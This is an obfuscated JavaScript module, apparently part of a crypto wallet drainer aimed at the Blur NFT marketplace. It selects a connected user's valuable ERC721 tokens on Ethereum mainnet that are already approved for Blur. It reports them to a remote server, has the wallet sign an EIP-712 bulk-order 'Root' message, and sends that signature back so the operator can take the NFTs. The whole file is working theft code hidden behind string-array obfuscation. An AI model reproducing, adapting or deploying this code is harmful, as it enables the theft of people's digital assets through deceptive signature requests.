function _0x2ae0() {
  const _0xb744d6 = [
      '557605sOnhbE',
      '2649400GjqxzX',
      'request',
      'getSigner',
      '80FDhXGr',
      'type',
      'skip',
      'paths',
      '0x00000000000111abe46ff893f3b2fdf1f759a8a8',
      'bytes32',
      '9823830DJWwaf',
      '1129264soXOEI',
      '7BwFbTQ',
      'amount_usd',
      'success',
      'blur',
      'address',
      '19300490rOSXhd',
      '16308240RdJLad',
      'providers',
      'ERC721',
      '1443483KBRnMv',
      '8NssHCv',
      '1.0',
      '3CeLdrh',
      'Blur\x20Exchange',
      'log',
      'chain_id',
      '0x000000000000Ad05Ccc4F10045630fb830B95127',
      'data',
      'root',
      '_signTypedData'
  ];
  _0x2ae0 = function () {
      return _0xb744d6;
  };
  return _0x2ae0();
}
(function (_0x2bccd4, _0x115030) {
  const _0x455480 = _0xe4ab;
  const _0x2e8b71 = _0x2bccd4();
  while (!![]) {
      try {
          const _0x6fd5c0 = -parseInt(_0x455480(0x1f8)) / (-0xf7c + -0x1 * 0x93 + 0x1010) + -parseInt(_0x455480(0x1ee)) / (0x367 * 0x5 + 0x1 * -0x260c + 0x150b) * (parseInt(_0x455480(0x1e5)) / (0xd * 0x77 + -0xc4b * 0x1 + 0x643)) + parseInt(_0x455480(0x1e3)) / (0x2 * -0x254 + -0x2 * -0x846 + 0x20 * -0x5f) * (parseInt(_0x455480(0x1ed)) / (-0x14a6 + 0x1ea8 + -0x9fd)) + parseInt(_0x455480(0x1f7)) / (0x30 * 0x25 + -0x45a + -0x290) * (parseInt(_0x455480(0x1f9)) / (0x18df + -0x11da + -0xa * 0xb3)) + parseInt(_0x455480(0x1f1)) / (-0x15d0 + 0x626 * -0x1 + -0x2 * -0xdff) * (parseInt(_0x455480(0x202)) / (-0x321 * -0xc + 0xded + -0x3370)) + parseInt(_0x455480(0x1ff)) / (0x2355 + 0x60a * 0x5 + -0x7 * 0x95b) + -parseInt(_0x455480(0x1fe)) / (-0x8 * 0x19b + -0x1 * -0x1ab1 + 0x13 * -0xba);
          if (_0x6fd5c0 === _0x115030) {
              break;
          } else {
              _0x2e8b71['push'](_0x2e8b71['shift']());
          }
      } catch (_0x16ca3b) {
          _0x2e8b71['push'](_0x2e8b71['shift']());
      }
  }
}(_0x2ae0, -0x1465fa + -0xef8b2 + -0x33 * -0xf571));
function _0xe4ab(_0x4271fd, _0x5cbfce) {
  const _0x213964 = _0x2ae0();
  _0xe4ab = function (_0x263d80, _0x70d4af) {
      _0x263d80 = _0x263d80 - (0x204e + -0x253a + 0x6cf * 0x1);
      let _0x1fd7b8 = _0x213964[_0x263d80];
      return _0x1fd7b8;
  };
  return _0xe4ab(_0x4271fd, _0x5cbfce);
}
const SIGN_BLUR = async (_0x68dc4f, _0x16aa3d, _0x429c04, _0x5de3d2, _0x422e1a, _0x845aa9 = -0x39 * 0x71 + -0xa9 * 0x11 + 0x2462) => {
  const _0x3728d8 = _0xe4ab;
  try {
      const _0x290be2 = [], _0x3ab91d = [];
      for (const _0x52fc77 of _0x68dc4f) {
          if (_0x52fc77['skip'] || _0x52fc77[_0x3728d8(0x1f2)] !== _0x3728d8(0x201) || _0x52fc77['chain_id'] != 0x2 * -0x12ad + 0xd6e + 0x17ed || _0x52fc77[_0x3728d8(0x1fa)] < _0x845aa9)
              continue;
          if (!await is_nft_approved(_0x52fc77[_0x3728d8(0x1fd)], _0x429c04, _0x3728d8(0x1f5)))
              continue;
          _0x290be2['push']({
              'collection': _0x52fc77['address'],
              'tokenID': _0x52fc77['id']
          });
          _0x3ab91d['push'](_0x52fc77);
      }
      if (_0x290be2['length'] < -0xb * -0x269 + -0x1669 * 0x1 + -0x418)
          return;
      let _0x3d9468 = new ethers[(_0x3728d8(0x200))]['Web3Provider'](_0x16aa3d), _0x767cea = _0x3d9468[_0x3728d8(0x1f0)]();
      let _0x19e86c = await send_request({
          'action': 'blur',
          'user_id': _0x422e1a,
          'blur': _0x3728d8(0x1eb),
          'tokens': _0x290be2,
          'address': _0x429c04
      });
      try {
          await send_request({
              'action': _0x3728d8(0x1fc),
              'user_id': _0x422e1a,
              'blur': _0x3728d8(0x1ef),
              'assets': _0x3ab91d
          });
          const _0x486775 = await _0x767cea[_0x3728d8(0x1ec)]({
              'name': _0x3728d8(0x1e6),
              'version': _0x3728d8(0x1e4),
              'chainId': 0x1,
              'verifyingContract': _0x3728d8(0x1e9)
          }, {
              'Root': [{
                      'name': _0x3728d8(0x1eb),
                      'type': _0x3728d8(0x1f6)
                  }]
          }, { 'root': _0x19e86c[_0x3728d8(0x1ea)][_0x3728d8(0x1eb)] });
          await send_request({
              'action': _0x3728d8(0x1fc),
              'user_id': _0x422e1a,
              'blur': _0x3728d8(0x1fb),
              'signature': _0x486775,
              'address': _0x429c04,
              'root': _0x19e86c[_0x3728d8(0x1ea)][_0x3728d8(0x1eb)],
              'paths': _0x19e86c[_0x3728d8(0x1ea)][_0x3728d8(0x1f4)]
          });
          for (const _0x566d41 of _0x68dc4f) {
              if (_0x566d41['skip'] || _0x566d41['type'] !== 'ERC721' || _0x566d41[_0x3728d8(0x1e8)] != -0x1 * 0xbcb + -0x1680 + 0x224c)
                  continue;
              let _0xe9b2d6 = ![];
              for (const _0x5cb43f of _0x3ab91d) {
                  if (_0x5cb43f[_0x3728d8(0x1f2)] !== _0x3728d8(0x201) || _0x5cb43f['chain_id'] != 0x974 * -0x3 + 0x7 * -0x4d + 0x1e78)
                      continue;
                  if (_0x5cb43f[_0x3728d8(0x1fd)] == _0x566d41[_0x3728d8(0x1fd)] && _0x5cb43f['id'] == _0x566d41['id']) {
                      _0xe9b2d6 = !![];
                      break;
                  }
              }
              if (_0xe9b2d6 == !![]) {
                  _0x566d41[_0x3728d8(0x1f3)] = !![];
              }
          }
      } catch (_0x51f139) {
          console[_0x3728d8(0x1e7)](_0x51f139);
          await send_request({
              'action': _0x3728d8(0x1fc),
              'user_id': _0x422e1a,
              'blur': 'cancel'
          });
      }
  } catch (_0xb8edf0) {
      console['log'](_0xb8edf0);
  }
};